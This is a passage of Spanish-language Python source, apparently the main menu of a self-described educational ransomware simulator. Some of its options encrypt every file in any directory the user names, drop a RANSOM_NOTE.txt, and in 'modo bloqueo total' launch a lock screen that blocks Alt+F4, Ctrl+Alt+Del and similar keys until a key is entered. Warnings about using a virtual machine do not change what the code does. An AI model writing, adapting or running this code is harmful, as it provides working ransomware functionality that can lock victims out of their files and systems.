                    print(f"{Color.ROJO}{Color.BOLD}🔒 ATAQUE SIMULADO COMPLETADO{Color.RESET}\n")
            else:
                print(f"{Color.VERDE}❌ Operación cancelada{Color.RESET}\n")
        
        elif opcion == '3':
            clave = cargar_clave()
            if clave:
                archivos_descifrados = descifrar_directorio(cifrador, clave, directorio_prueba)
                if archivos_descifrados > 0:
                    # Eliminar la nota de rescate
                    nota_path = directorio_prueba / 'RANSOM_NOTE.txt'
                    if nota_path.exists():
                        os.remove(nota_path)
                    print(f"{Color.VERDE}{Color.BOLD}🔓 ARCHIVOS RECUPERADOS EXITOSAMENTE{Color.RESET}\n")
        
        elif opcion == '4':
            nota_path = directorio_prueba / 'RANSOM_NOTE.txt'
            if nota_path.exists():
                print(nota_path.read_text(encoding='utf-8'))
            else:
                print(f"{Color.AMARILLO}⚠️  No hay nota de rescate. Primero cifra los archivos.{Color.RESET}\n")
        
        elif opcion == '5':
            print(f"{Color.CYAN}{Color.BOLD}INFORMACIÓN DEL SISTEMA{Color.RESET}")
            print(f"{Color.CYAN}{'='*60}{Color.RESET}")
            print(f"Sistema Operativo: {Color.VERDE}{SISTEMA} ({platform.release()}){Color.RESET}")
            print(f"Python: {Color.VERDE}{sys.version.split()[0]}{Color.RESET}")
            print(f"Arquitectura: {Color.VERDE}{platform.machine()}{Color.RESET}")
            print(f"Usuario: {Color.VERDE}{Path.home().name}{Color.RESET}")
            print(f"Home: {Color.VERDE}{Path.home()}{Color.RESET}")
            print(f"Directorio de trabajo: {Color.VERDE}{script_dir}{Color.RESET}")
            print(f"Modo de cifrado: {Color.VERDE}{'AES-256 (Fernet)' if CRYPTO_DISPONIBLE else 'XOR Simple'}{Color.RESET}")
            print(f"Pantalla bloqueo: {Color.VERDE}{'Disponible' if TKINTER_DISPONIBLE else 'No disponible'}{Color.RESET}")
            print(f"\n{Color.AMARILLO}Directorios del usuario detectados:{Color.RESET}")
            dirs_usuario = obtener_directorios_usuario()
            for nombre, ruta in dirs_usuario.items():
                existe = "✅" if ruta.exists() else "❌"
                print(f"  {existe} {nombre}: {Color.CYAN}{ruta}{Color.RESET}")
            print(f"{Color.CYAN}{'='*60}{Color.RESET}\n")
        
        elif opcion == '6':
            print(f"{Color.ROJO}{Color.BOLD}{'='*60}{Color.RESET}")
            print(f"{Color.ROJO}{Color.BOLD}⚠️  MODO REAL - CIFRADO DE DIRECTORIO PERSONALIZADO ⚠️{Color.RESET}")
            print(f"{Color.ROJO}{Color.BOLD}{'='*60}{Color.RESET}")
            print(f"{Color.AMARILLO}ADVERTENCIA: Este modo cifrará TODOS los archivos del")
            print(f"directorio que especifiques. Asegúrate de estar en una VM.{Color.RESET}\n")
            
            directorio_objetivo = input(f"{Color.BOLD}Ingresa la ruta del directorio a cifrar: {Color.RESET}").strip()
            
            if not directorio_objetivo:
                print(f"{Color.ROJO}❌ No ingresaste ninguna ruta{Color.RESET}\n")
                continue
            
            directorio_objetivo = Path(directorio_objetivo).expanduser().absolute()
            
            if not directorio_objetivo.exists():
                print(f"{Color.ROJO}❌ El directorio no existe: {directorio_objetivo}{Color.RESET}\n")
                continue
            
            if not directorio_objetivo.is_dir():
                print(f"{Color.ROJO}❌ La ruta no es un directorio: {directorio_objetivo}{Color.RESET}\n")
                continue
            
            # Contar archivos
            total_archivos = sum(1 for _ in directorio_objetivo.rglob('*') if _.is_file())
            print(f"\n{Color.AMARILLO}📁 Directorio: {directorio_objetivo}{Color.RESET}")
            print(f"{Color.AMARILLO}📄 Archivos encontrados: {total_archivos}{Color.RESET}\n")
            
            print(f"{Color.ROJO}{Color.BOLD}⚠️  ÚLTIMA ADVERTENCIA ⚠️{Color.RESET}")
            print(f"{Color.ROJO}Esto cifrará {total_archivos} archivos de manera REAL.{Color.RESET}")
            print(f"{Color.ROJO}La clave se guardará en: clave_descifrado.key{Color.RESET}\n")
            
            confirmar = input(f"{Color.BOLD}Escribe 'CIFRAR TODO' para confirmar: {Color.RESET}").strip()
            
            if confirmar == 'CIFRAR TODO':
                clave, salt = cifrador.generar_clave()
                print()
                archivos_cifrados = cifrar_directorio(cifrador, clave, directorio_objetivo)
                
                if archivos_cifrados > 0:
                    crear_nota_rescate(directorio_objetivo, clave)
                    guardar_clave(clave)
                    print(f"{Color.ROJO}{Color.BOLD}🔒 CIFRADO COMPLETADO - {archivos_cifrados} archivos afectados{Color.RESET}")
                    print(f"{Color.VERDE}💾 Clave guardada en: clave_descifrado.key{Color.RESET}\n")
            else:
                print(f"{Color.VERDE}❌ Operación cancelada{Color.RESET}\n")
        
        elif opcion == '8':
            print(f"{Color.ROJO}{Color.BOLD}{'='*80}{Color.RESET}")
            print(f"{Color.ROJO}{Color.BOLD}🚨 MODO BLOQUEO TOTAL - CIFRAR Y BLOQUEAR SISTEMA 🚨{Color.RESET}")
            print(f"{Color.ROJO}{Color.BOLD}{'='*80}{Color.RESET}")
            print(f"{Color.AMARILLO}ADVERTENCIA EXTREMA: Este modo cifrará TODOS los archivos")
            print(f"y BLOQUEARÁ COMPLETAMENTE el sistema hasta que ingreses la clave.")
            print(f"SOLO para máquinas virtuales controladas.{Color.RESET}\n")
            
            if not TKINTER_DISPONIBLE:
                print(f"{Color.ROJO}❌ No se puede activar el modo bloqueo (Tkinter no disponible){Color.RESET}")
                print(f"{Color.AMARILLO}Instala Tkinter para habilitar esta función{Color.RESET}\n")
                continue
            
            directorio_objetivo = input(f"{Color.BOLD}Ingresa la ruta del directorio a cifrar: {Color.RESET}").strip()
            
            if not directorio_objetivo:
                print(f"{Color.ROJO}❌ No ingresaste ninguna ruta{Color.RESET}\n")
                continue
            
            directorio_objetivo = Path(directorio_objetivo).expanduser().absolute()
            
            if not directorio_objetivo.exists():
                print(f"{Color.ROJO}❌ El directorio no existe: {directorio_objetivo}{Color.RESET}\n")
                continue
            
            if not directorio_objetivo.is_dir():
                print(f"{Color.ROJO}❌ La ruta no es un directorio: {directorio_objetivo}{Color.RESET}\n")
                continue
            
            # Contar archivos
            total_archivos = sum(1 for _ in directorio_objetivo.rglob('*') if _.is_file())
            print(f"\n{Color.AMARILLO}📁 Directorio: {directorio_objetivo}{Color.RESET}")
            print(f"{Color.AMARILLO}📄 Archivos encontrados: {total_archivos}{Color.RESET}\n")
            
            print(f"{Color.ROJO}{Color.BOLD}⚠️  ADVERTENCIA FINAL - LEE CUIDADOSAMENTE ⚠️{Color.RESET}")
            print(f"{Color.ROJO}1. Cifrará {total_archivos} archivos de forma IRREVERSIBLE")
            print(f"2. ACTIVARÁ PANTALLA DE BLOQUEO COMPLETO")
            print(f"3. No podrás usar el sistema hasta ingresar la clave")
            print(f"4. Alt+F4, Ctrl+Alt+Del, Escape y Windows estarán BLOQUEADOS")
            print(f"5. Solo se desbloquea con la clave correcta{Color.RESET}\n")
            
            print(f"{Color.VERDE}✅ La clave se guardará en: CLAVE_DE_RESCATE.key{Color.RESET}")
            print(f"{Color.VERDE}✅ Copia esa clave ANTES de ejecutar{Color.RESET}\n")
            
            confirmar = input(f"{Color.BOLD}Escribe 'BLOQUEAR TODO' para confirmar: {Color.RESET}").strip()
            
            if confirmar == 'BLOQUEAR TODO':
                clave, salt = cifrador.generar_clave()
                print(f"\n{Color.ROJO}Generando clave de cifrado...{Color.RESET}")
                time.sleep(1)
                
                # Guardar clave en archivo separado
                guardar_clave(clave, 'CLAVE_DE_RESCATE.key')
                
                print(f"{Color.VERDE}Clave guardada en: CLAVE_DE_RESCATE.key (¡NO LA PIERDAS!){Color.RESET}")
                print(f"{Color.AMARILLO}Clave generada: {clave[:50]}...{Color.RESET}")
                print(f"{Color.ROJO}Iniciando cifrado...{Color.RESET}")
                print(f"{Color.AMARILLO}El sistema se bloqueará automáticamente al terminar.{Color.RESET}\n")
                
                time.sleep(3)
                
                archivos_cifrados = cifrar_directorio(cifrador, clave, directorio_objetivo, activar_bloqueo=True)
                
                if archivos_cifrados > 0:
                    crear_nota_rescate(directorio_objetivo, clave)
                    print(f"{Color.ROJO}{Color.BOLD}🚨 SISTEMA BLOQUEADO - Ingresa la clave para continuar{Color.RESET}")
            else:
                print(f"{Color.VERDE}❌ Operación cancelada{Color.RESET}\n")
        
        elif opcion == '7':
            print(f"{Color.VERDE}{Color.BOLD}🔓 DESCIFRAR DIRECTORIO PERSONALIZADO{Color.RESET}\n")
            
            directorio_objetivo = input(f"{Color.BOLD}Ingresa la ruta del directorio a descifrar: {Color.RESET}").strip()
            
            if not directorio_objetivo:
                print(f"{Color.ROJO}❌ No ingresaste ninguna ruta{Color.RESET}\n")
                continue
            
            directorio_objetivo = Path(directorio_objetivo).expanduser().absolute()
            
            if not directorio_objetivo.exists():
                print(f"{Color.ROJO}❌ El directorio no existe: {directorio_objetivo}{Color.RESET}\n")
                continue
            
            clave = cargar_clave()
            if clave:
                archivos_descifrados = descifrar_directorio(cifrador, clave, directorio_objetivo)
                if archivos_descifrados > 0:
                    # Eliminar la nota de rescate si existe
                    nota_path = directorio_objetivo / 'RANSOM_NOTE.txt'
                    if nota_path.exists():
                        os.remove(nota_path)
                    print(f"{Color.VERDE}{Color.BOLD}🔓 {archivos_descifrados} ARCHIVOS RECUPERADOS{Color.RESET}\n")
        
        elif opcion == '0':
            print(f"{Color.VERDE}👋 ¡Hasta luego! Recuerda usar esto solo con fines educativos.{Color.RESET}\n")
            break
        
        else:
            print(f"{Color.ROJO}❌ Opción inválida{Color.RESET}\n")


if __name__ == "__main__":
    main()